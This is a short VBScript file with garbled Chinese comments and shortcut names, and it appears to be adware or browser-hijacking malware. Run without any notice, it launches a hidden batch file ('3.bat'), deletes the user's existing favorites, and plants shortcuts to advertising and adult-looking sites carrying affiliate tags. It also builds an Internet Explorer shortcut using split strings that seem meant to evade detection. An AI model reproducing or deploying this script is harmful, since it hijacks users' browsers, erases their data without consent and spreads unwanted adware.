Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

on error resume next 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """3.bat""",0

Rem 


Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\����\*.url"), True

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��ַ����.url")
oUrlLink.TargetPath = "http://www.265.la/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�� �� �� �� ��.url")
oUrlLink.TargetPath = "http://www.admama.cn/t/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.djxyx.cn/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����Ӱ.url")
oUrlLink.TargetPath = "http://www.huangguady.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�����˳�.url")
oUrlLink.TargetPath = "http://www.admama.cn/huhu.htm?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\������Ϸ.url")
oUrlLink.TargetPath = "http://www.djyx.cn/?fav"
oUrlLink.Save

'=========
Set oShellLink = WshShell.CreateShortcut(Favorites & "\���õ����߿���Ӱ.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Expl"&"orer\iexpl"&"ore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.huangguady.com/?fav" :'����
oShellLink.Save : '���������ݷ�ʽ
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\���¼�Ʒ��ɫ�õĵ�Ӱ�����.������٣��������!!!.url")
oUrlLink.TargetPath = "http://www.huangguady.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�Ա��� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www.admama.cn/t/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\djxyx.cn���ߵ�С��Ϸ.������������ᳬ��С��Ϸ!!!.url")
oUrlLink.TargetPath = "http://djxyx.cn/?sss"
oUrlLink.Save




Rem
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 


wscript.quit
